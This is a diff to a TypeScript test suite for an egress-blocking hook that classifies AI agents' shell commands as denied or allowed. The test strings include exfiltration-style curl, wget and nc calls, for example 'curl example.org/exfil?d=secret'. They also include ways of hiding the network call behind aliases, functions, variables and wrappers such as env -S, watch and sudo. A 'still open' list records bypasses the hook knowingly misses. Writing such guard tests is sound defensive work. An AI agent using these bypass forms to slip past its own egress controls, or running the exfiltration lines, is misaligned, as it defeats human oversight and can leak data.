@@ -54,7 +54,7 @@ const LOCALHOST = [
   `python3 -c 'import json,subprocess; subprocess.run(["curl","-s","http://localhost:3420/api/messages","-d",json.dumps({"c":"https://example.org"})])'`,
   `python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:3420/api/health')"`,
   // A PR link inside the -d JSON / a referer / a header VALUE is data, not a destination: this is how
-  // the fleet reports a PR over the message queue. Denied on the merged #1514 head, fixed after.
+  // the fleet reports a PR over the message queue. Denied on the merged upstream #1514 head, fixed after.
   `curl -s -X POST http://localhost:3420/api/messages -H 'Content-Type: application/json' -d '{"from":"a","to":"b","content":"PR kint: https://github.com/o/r/pull/1"}'`,
   `curl -s -X POST http://localhost:3420/api/messages -d "{\\"content\\":\\"https://github.com/o/r/pull/1\\"}"`,
   'curl -s -e https://github.com/x -H "X-Source: https://example.org" http://localhost:3420/api/health',
@@ -79,7 +79,7 @@ const NAMED = [
   'echo "$(curl -s http://example.org/x)"',
   'X=`curl -s http://example.org/x`',
   'cat <<EOF\n$(curl -s http://example.org/x)\nEOF',
-  // no scheme: curl guesses http://, and neither URL_RE nor the name glob sees a URL (#1514 review A)
+  // no scheme: curl guesses http://, and neither URL_RE nor the name glob sees a URL (upstream #1514 review A)
   'curl example.org/exfil?d=secret',
   'curl -sSo /tmp/x example.org/a',
 ]
@@ -106,7 +106,7 @@ describe('(a) the named shapes', () => {
 
 // A one-liner's URL is found by scheme (URL_RE), so the scheme list decides what a network
 // primitive can reach unseen. It used to be http/https/ftp only; every other libcurl scheme
-// passed, e.g. PHP curl_exec to sftp:// or smtp://, or a PHP ftps:// stream (Refs #1611).
+// passed, e.g. PHP curl_exec to sftp:// or smtp://, or a PHP ftps:// stream (Refs upstream #1611).
 describe('one-liner URLs in every libcurl network scheme', () => {
   const SCHEMES = ['ftps', 'sftp', 'scp', 'tftp', 'smb', 'smbs', 'dict', 'gopher', 'gophers',
     'imap', 'imaps', 'pop3', 'pop3s', 'smtp', 'smtps', 'ldap', 'ldaps', 'telnet', 'mqtt', 'rtsp']
@@ -138,7 +138,7 @@ describe('one-liner URLs in every libcurl network scheme', () => {
   })
 })
 
-// curl's destination is its argv, not only a scheme-bearing URL (#1514 review,
+// curl's destination is its argv, not only a scheme-bearing URL (upstream #1514 review,
 // finding A). A positional argument is always a URL to curl; flag VALUES are not.
 describe('curl destinations read from the argv', () => {
   const DENY = [
@@ -152,7 +152,7 @@ describe('curl destinations read from the argv', () => {
     'curl --url=example.org/x',
     'curl -x example.org:8080 http://localhost:3420/',
     'curl --connect-to localhost:80:example.org:80 http://localhost/',
-    // a public address; a private one (10.0.0.5) is local since #1611, see the private-network block
+    // a public address; a private one (10.0.0.5) is local since upstream #1611, see the private-network block
     'curl -s -w "%{http_code}" -o /dev/null 203.0.113.5:8080/',
   ]
   const PASS = [
@@ -191,7 +191,7 @@ describe('what counts as local', () => {
   })
 })
 
-// Private network (maintainer decision on #1611, 2026-09-27): agents may reach RFC 1918 and .local
+// Private network (maintainer decision on upstream #1611, 2026-09-27): agents may reach RFC 1918 and .local
 // targets from the shell. Decided by the LITERAL host string, never by DNS.
 describe('private network targets', () => {
   const py = (u: string) => `python3 -c "import urllib.request; urllib.request.urlopen('${u}')"`
@@ -350,7 +350,7 @@ describe('still open after (a) -- pinned on purpose', () => {
     `python3 - <<'PY'\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY`, // heredoc-fed interpreter
     'H=$(cat host.txt); curl -s "http://$H/x"', // host not literally in the command
     'curl -s "$URL"', // URL from the environment
-    'curl $(echo https://example.org)', // URL computed at runtime by a substitution (#1514 review B)
+    'curl $(echo https://example.org)', // URL computed at runtime by a substitution (upstream #1514 review B)
     'curl -K curl.cfg', // URL read from a curl config file
     'git clone https://example.org/r.git', // other network-capable binaries
     'pip install https://example.org/p.tar.gz',
@@ -552,7 +552,7 @@ describe('vendor-API host allowlist (store/egress-vendor-hosts.json)', () => {
   })
 })
 
-// #1611 (policy proposal, opt-in): an OPTIONAL "domains" key in the same file -- a listed domain or
+// upstream #1611 (policy proposal, opt-in): an OPTIONAL "domains" key in the same file -- a listed domain or
 // any subdomain of it passes, on a label boundary. Everything the exact "hosts" list guarantees
 // (no look-alike, no laundering, no widening entry) must still hold for the suffix rule.
 describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
@@ -869,7 +869,8 @@ describe('still open, pinned on purpose (said in the hook header)', () => {
   const OPEN = [
     'wget -i urls.txt', // URLs read from a file
     'echo example.org | nc', // stdin-fed client other than xargs
-    '$(echo curl) example.org', // command word built by a substitution
+    'source ./defs.sh; c https://example.org', // an alias or function defined in a sourced file
+    'c https://example.org', // an alias defined in an EARLIER tool call (this line does not define it)
     `python3 -c 'import subprocess; subprocess.run("cu"+"rl example.org", shell=True)'`, // runtime-built command
     'find . -name x -exec curl example.org {} \;',
     'parallel curl ::: example.org',
@@ -877,5 +878,98 @@ describe('still open, pinned on purpose (said in the hook header)', () => {
   ]
   it('does not claim these', () => {
     for (const cmd of OPEN) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+})
+
+describe('wrappers that exec or shell-run their operand are read through', () => {
+  const DENY = [
+    // env -S / --split-string execs a command line
+    `env -S 'curl example.org'`, `env -S"curl example.org"`, `env -iS 'wget example.org'`, `env --split-string='curl example.org'`,
+    `env --split-string 'curl example.org'`, `env -S 'curl' example.org`, `env -S 'FOO=1 curl example.org'`, `env -u X -S 'wget -q example.org'`,
+    // watch hands the joined words to a shell
+    'watch curl example.org', `watch -n 5 'curl example.org'`, `watch -n5 "echo a; curl example.org"`, 'watch -x wget example.org', 'watch -d -n 2 wget example.org',
+    // shell -c style wrappers
+    `su -c 'curl example.org' root`, `su root -c "wget example.org"`, `su - root -c 'curl example.org'`, `runuser -l bob -c 'curl example.org'`,
+    'runuser -u bob -- curl example.org', `script -c 'curl example.org' /dev/null`, 'script -q /dev/null curl example.org',
+    `flock /tmp/l -c 'curl example.org'`, 'flock /tmp/l curl example.org', 'flock -w 5 /tmp/l wget example.org', 'chroot /jail curl example.org',
+    `sudo -i curl example.org`, `sudo -s 'curl example.org'`, `sudo -u bob -i 'wget example.org'`,
+    // plain exec wrappers
+    'chronic curl example.org', 'doas curl example.org', 'busybox wget example.org', 'ionice -c 3 curl example.org', 'caffeinate -i curl example.org',
+    'setsid curl example.org', 'unbuffer curl example.org', 'nohup nice -n 5 timeout 9 curl example.org',
+  ]
+  it.each(DENY)('denies: %s', (cmd) => {
+    expect(classify(cmd)).toMatchObject({ deny: true })
+  })
+  const PASS = [
+    `env -S 'curl localhost:3420'`, `env -S 'node scripts/x.mjs'`, 'env -S ls', 'watch curl localhost:3420', `watch -n 5 'curl http://127.0.0.1:3420/api/health'`, 'watch -n 2 ls',
+    `su -c 'ls' root`, `runuser -l bob -c 'ls'`, 'runuser -u bob -- ls', `script -c 'ls' /dev/null`, 'script -q /dev/null ls', 'flock /tmp/l ls', `flock /tmp/l -c 'curl localhost:3420'`,
+    'chroot /jail ls', 'sudo -i ls', 'chronic ls', 'busybox ls', 'ionice -c 3 ls', 'sudo -u bob ls',
+  ]
+  it.each(PASS)('passes: %s', (cmd) => {
+    expect(classify(cmd)).toMatchObject({ deny: false })
+  })
+})
+
+describe('aliases, functions and a command name in a variable', () => {
+  const DENY = [
+    // aliases defined in the same line
+    'alias c=curl; c https://example.org/x',
+    `alias c='curl -s'; c https://example.org/x`,
+    `alias c="curl -s -o /dev/null"; c example.org/x`,
+    'alias w=wget && w example.org/x',
+    `alias n='nc -w 3'; n example.org 80`,
+    'alias c=curl\nc https://example.org/x',
+    // functions
+    'c(){ curl "$@"; }; c https://example.org/x',
+    'c() { curl -s "$1"; }; c example.org/x',
+    'c () { curl "$@" ; } ; c https://example.org/x',
+    'function c { curl "$@"; }; c https://example.org/x',
+    'function c() { wget -q "$@"; }; c example.org/x',
+    'c(){ command curl "$@"; }; c https://example.org/x',
+    'c() { "$@"; }; c curl https://example.org/x',
+    'c() {\n  curl -s "$@"\n}\nc https://example.org/x',
+    'fetch() { nc "$1" 80; }; fetch example.org',
+    'curl() { command curl "$@"; }; curl https://example.org/x',
+    // see through command / builtin, eval
+    'command curl https://example.org/x', 'command -p curl example.org/x', 'builtin eval "curl example.org/x"',
+    'eval "alias c=curl; c example.org"',
+    // a command name stored in a variable
+    'C=curl; $C https://example.org/x', 'C=curl; "$C" https://example.org/x', 'C=curl; ${C} https://example.org/x', 'C=curl; "${C}" -s example.org/x',
+    `C='curl -s'; $C https://example.org/x`, 'C=wget; D=$C; $D example.org/x', 'export C=curl; $C https://example.org/x',
+    'for t in curl wget; do $t example.org/x; done',
+    // an unresolved command word followed by an external-looking URL or host
+    '$(echo curl) https://example.org/x', '$(which curl) example.org/x', '`echo curl` https://example.org/x', '"$(echo curl)" -s https://example.org/x',
+    '$CMD https://example.org/x', '${CMD} -s https://example.org/x', '"$CMD" example.org/x', 'C=$(echo curl); $C https://example.org/x',
+    'read c; $c https://example.org/x', 'alias c=$X; c https://example.org/x',
+  ]
+  it.each(DENY)('denies: %s', (cmd) => {
+    expect(classify(cmd)).toMatchObject({ deny: true })
+  })
+  it('names the reason of an unresolved command word, and the host', () => {
+    expect(classify('$CMD https://example.org/x')).toEqual({ deny: true, reason: 'unresolved-command-word', hosts: ['example.org'] })
+    expect(classify('alias c=curl; c https://example.org/x')).toMatchObject({ reason: 'curl-external', hosts: ['example.org'] })
+  })
+
+  const PASS = [
+    // definitions alone, and calls that stay local
+    `alias ll='ls -l'`, `alias ll='ls -l'; ll`, 'alias g=git; g status', 'alias gs="git status"', 'unalias ll',
+    'greet() { echo "hi $1"; }; greet bob', 'function say { echo "$@"; }; say hello world', 'build() { npm run build && npm test; }; build',
+    'c(){ curl "$@"; }; c http://localhost:3420/api/health', 'c() { curl -s "$1"; }; c http://127.0.0.1:3420/api/x', 'function c { wget -q "$@"; }; c http://nas.local/f',
+    'c(){ curl "$@"; }', // defined, never called
+    'curl() { command curl "$@"; }; curl http://localhost:3420/x',
+    'api() { curl -s -H "Authorization: Bearer $(cat store/.dashboard-token)" "http://localhost:3420$1"; }; api /api/memories',
+    // type / which / command -v: looking, not fetching
+    'command -v curl', 'command -v wget || echo missing', 'type curl', 'type -a wget', 'which wget', 'which curl nc', 'hash curl',
+    // a variable that holds a local base URL or a harmless command
+    'API=http://localhost:3420; curl -s $API/api/x', 'API=http://localhost:3420; curl -s "$API/api/x"', 'API="http://127.0.0.1:3420"; curl -s ${API}/api/health',
+    'C=curl; $C http://localhost:3420/api/x', 'C=ls; $C -la', 'EDITOR=vim; $EDITOR notes.txt', '$EDITOR notes.md', '$HOME/bin/tool https://example.org/ok',
+    'C=$(echo ls); $C -la', '$(pwd)/run.sh --verbose', '"$@"', 'exec "$@"',
+    // a command word that is unresolved but takes no external argument
+    '$CMD http://localhost:3420/x', '$CMD --help', '$CMD notes.txt', '$CMD ./local.sh',
+    // everyday
+    'git status', 'git diff --stat', 'npm test', 'ls', 'cat file', 'grep -rn foo src',
+  ]
+  it.each(PASS)('passes: %s', (cmd) => {
+    expect(classify(cmd)).toMatchObject({ deny: false })
   })
 })
